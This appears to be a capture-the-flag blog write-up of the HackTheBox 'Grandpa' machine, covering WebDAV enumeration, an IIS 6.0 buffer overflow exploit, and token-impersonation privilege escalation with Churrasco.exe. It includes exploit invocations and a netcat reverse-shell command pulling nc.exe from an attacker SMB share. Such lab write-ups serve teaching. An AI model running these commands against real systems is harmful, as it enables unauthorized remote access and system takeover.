---
title: "Grandpa"
date: 2023-08-30T13:24:37+02:00
tags: ["windows","web","privesc","buffer overflow"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
summary: "Windows machine with a website which has a buffer overflow vulnerability which allow us to get RCE. Thanks to Churrasco.exe we exploit the SeImpersonatePrivilege to privEsc."
description: "Windows machine with a website which has a buffer overflow vulnerability which allow us to get RCE. Thanks to Churrasco.exe we exploit the SeImpersonatePrivilege to privEsc."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Grandpa
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Grandpa

![Untitled](/HTB/grandpa-icon.png)

## Tools Used

- nmap
- davtest
- searchsploit

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Wed, 23 Aug 2023 11:04:23 GMT
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We have only one port with a **http** site running and up.

## Enumeration

The website is gonna be our unique point of entry so let’s visit it.

![Untitled](/HTB/grandpa-1.png)

We have an **IIS** under construction page.

If we return to the **nmap** scan we can see that **webdav** is running as the granny machine so let’s test the **PUT** option with some extensions.

```bash
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.14
********************************************************
NOTE    Random string for this session: NHwzc9ANv
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     html    FAIL
PUT     php     FAIL
PUT     txt     FAIL
PUT     jsp     FAIL
PUT     cfm     FAIL
PUT     shtml   FAIL
PUT     asp     FAIL
PUT     cgi     FAIL
PUT     aspx    FAIL
PUT     jhtml   FAIL
PUT     pl      FAIL

********************************************************
/usr/bin/davtest Summary:
```

All failed 😫 so we can’t play with the extensions.

## Exploiting

As we know we have **IIS 6.0 webDAV** let’s see if there is some vuln at searchsploit

![Untitled](/HTB/grandpa-2.png)

The **remote buffer overflow** which gives us **RCE** looks great.

Once executed doesn’t seems to work pretty well so I decided to search other similar exploit.

![Untitled](/HTB/grandpa-3.png)

If we check the **exploitdb** website we can see the **CVE** so let’s google a equivalent exploit.

This **github [exploit](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)** worked for me. I perfomed the attack with the following command

```bash
python2 webdavBO.py 10.10.10.14 80 10.10.14.9 4444
```

## Gaining an Initial Foothold

![Untitled](/HTB/grandpa-4.png)

Navigating through the directories we can see the use of **Documents and Settings** folder as **Users** folder that tells you that the version is pretty older.

![Untitled](/HTB/grandpa-5.png)

If I try to access to **Harry** folder, we receive the following message.

![Untitled](/HTB/grandpa-6.png)

We need to **privEsc** in order to access to the user’s flag.

## Escalating Privilege

First of all, let’s check the current privileges

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

We can see that we have enabled the `SeImpersonatePrivilege` so as we know thanks to [Granny’s](https://pwndside.github.io/posts/granny-htb/) write up this is a vulnerability can be exploited so I am going to skip that part and go direct to the execution of **Churrasco.exe** in order to **privesc**.

```powershell
nc -lv 4445
```

```powershell
.\churrasco.exe "\\10.10.14.9\smbFolder\nc.exe -e cmd 10.10.14.9 4445"
```

![Untitled](/HTB/grandpa-7.png)

It has worked.

### Flag(s)

**User’s flag**

![Untitled](/HTB/grandpa-8.png)

**Root’s flag**

![Untitled](/HTB/grandpa-9.png)

**Thank you for reading, and happy hacking! 😄**
